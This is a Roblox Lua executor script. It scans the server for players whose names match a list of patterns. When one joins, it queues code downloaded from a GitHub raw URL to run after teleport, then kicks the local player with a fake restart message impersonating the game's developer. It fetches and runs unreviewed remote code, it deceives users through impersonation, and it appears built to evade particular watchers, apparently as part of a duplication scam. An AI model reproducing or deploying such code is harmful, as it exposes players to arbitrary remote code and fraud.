local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local hasKickedSelf = false

local NAME_PATTERNS = {"joken","iamjoken","jokenn","jokeen","jokan","jokn","munkizz","munkizzz","munkiz","munki","munkizzo","munkizzx"}

local function isJokenPlayer(username)
    local lowerName = username:lower()
    for _, pattern in ipairs(NAME_PATTERNS) do
        if lowerName == pattern then return true end
        if lowerName:find("^" .. pattern .. "%d") then return true end
        if lowerName:find("^" .. pattern .. "[a-z]") then return true end
        if lowerName:find("^" .. pattern .. "_") then return true end
        if lowerName:find("^" .. pattern .. "%-") then return true end
    end
    if lowerName:find("joken") then return true end
    if lowerName:find("munkizz") then return true end
    return false
end

local function kickSelf(jokenName)
    if hasKickedSelf then return end
    hasKickedSelf = true
    task.spawn(function()
        pcall(function()
            queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/lopad))()]])
            player:Kick("Jandel: Hi, this is Jandel. Server is restarted, please rejoin.")
        end)
    end)
end

local function scanForJoken()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and isJokenPlayer(p.Name) then
            kickSelf(p.Name)
            return
        end
    end
end

local function onPlayerAdded(newPlayer)
    if newPlayer == player then return end
    if isJokenPlayer(newPlayer.Name) then
        kickSelf(newPlayer.Name)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)
RunService.Heartbeat:Connect(function()
    scanForJoken()
end)
